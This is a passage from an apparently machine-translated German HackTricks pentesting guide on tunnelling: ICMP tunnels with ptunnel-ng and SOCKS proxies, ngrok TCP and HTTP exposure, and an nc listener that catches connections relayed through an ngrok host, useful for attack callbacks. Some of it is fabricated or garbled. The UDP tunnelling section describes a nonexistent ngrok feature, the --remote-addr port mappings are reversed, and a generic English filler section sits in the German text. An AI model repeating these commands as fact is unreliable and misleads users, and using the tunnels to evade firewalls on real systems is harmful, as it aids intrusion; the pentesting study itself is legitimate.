sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) ist ein Tool, um Lösungen mit einem einzigen Befehl an das Internet anzuschließen.**
*Die Expositions-URI sieht so aus:* **UID.ngrok.io**

### Installation

- Erstelle ein Konto: https://ngrok.com/signup
- Client-Download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
#### Tunneling TCP

TCP-Tunneling ermöglicht es Ihnen, eine TCP-Verbindung über einen öffentlichen Tunnel zu leiten. Dies kann nützlich sein, um auf Dienste zuzugreifen, die hinter einer Firewall oder einem NAT-Gerät gehostet werden.

##### Lokaler Port auf Remote-Port weiterleiten

Um einen lokalen Port auf einen Remote-Port weiterzuleiten, verwenden Sie den folgenden Befehl:

```bash
$ ngrok tcp <local-port>
```

Beispiel:

```bash
$ ngrok tcp 22
```

Dies leitet den lokalen Port 22 (SSH) auf einen zufälligen Remote-Port weiter, der von ngrok zugewiesen wird.

##### Remote-Port auf lokalen Port weiterleiten

Um einen Remote-Port auf einen lokalen Port weiterzuleiten, verwenden Sie den folgenden Befehl:

```bash
$ ngrok tcp --remote-addr=<remote-addr> <remote-port>
```

Beispiel:

```bash
$ ngrok tcp --remote-addr=1.tcp.ngrok.io:12345 8080
```

Dies leitet den Remote-Port 8080 auf den lokalen Port 12345 weiter.

#### Tunneling UDP

UDP-Tunneling ermöglicht es Ihnen, eine UDP-Verbindung über einen öffentlichen Tunnel zu leiten. Dies kann nützlich sein, um auf Dienste zuzugreifen, die UDP verwenden, wie z.B. DNS.

##### Lokaler Port auf Remote-Port weiterleiten

Um einen lokalen Port auf einen Remote-Port weiterzuleiten, verwenden Sie den folgenden Befehl:

```bash
$ ngrok udp <local-port>
```

Beispiel:

```bash
$ ngrok udp 53
```

Dies leitet den lokalen Port 53 (DNS) auf einen zufälligen Remote-Port weiter, der von ngrok zugewiesen wird.

##### Remote-Port auf lokalen Port weiterleiten

Um einen Remote-Port auf einen lokalen Port weiterzuleiten, verwenden Sie den folgenden Befehl:

```bash
$ ngrok udp --remote-addr=<remote-addr> <remote-port>
```

Beispiel:

```bash
$ ngrok udp --remote-addr=1.udp.ngrok.io:12345 53
```

Dies leitet den Remote-Port 53 auf den lokalen Port 12345 weiter.
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Offenlegung von Dateien über HTTP

To expose files using HTTP, you can follow these steps:

1. Start by setting up a web server on your local machine or a remote server. This can be done using tools like Apache, Nginx, or SimpleHTTPServer.

2. Place the files you want to expose in the web server's document root directory. This is usually a directory named "htdocs" or "www" in the server's configuration.

3. Ensure that the web server is running and accessible from the network. You can test this by accessing the server's IP address or hostname in a web browser.

4. Once the web server is up and running, you can access the files by specifying their path in the URL. For example, if the file you want to expose is named "example.txt" and is located in the document root directory, you can access it using the URL `http://<server_ip>/example.txt`.

5. To restrict access to the files, you can configure the web server to require authentication or implement access control rules. This will ensure that only authorized users can access the exposed files.

By following these steps, you can easily expose files using HTTP and make them accessible over the network.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Abhören von HTTP-Anfragen

*Nützlich für XSS, SSRF, SSTI ...*
Direkt von stdout oder über die HTTP-Schnittstelle [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling interner HTTP-Dienste
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Einfaches Beispiel für die Konfiguration der ngrok.yaml

Es öffnet 3 Tunnel:
- 2 TCP
- 1 HTTP mit statischer Dateiausstellung von /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Weitere Tools zum Überprüfen

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS erhalten oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
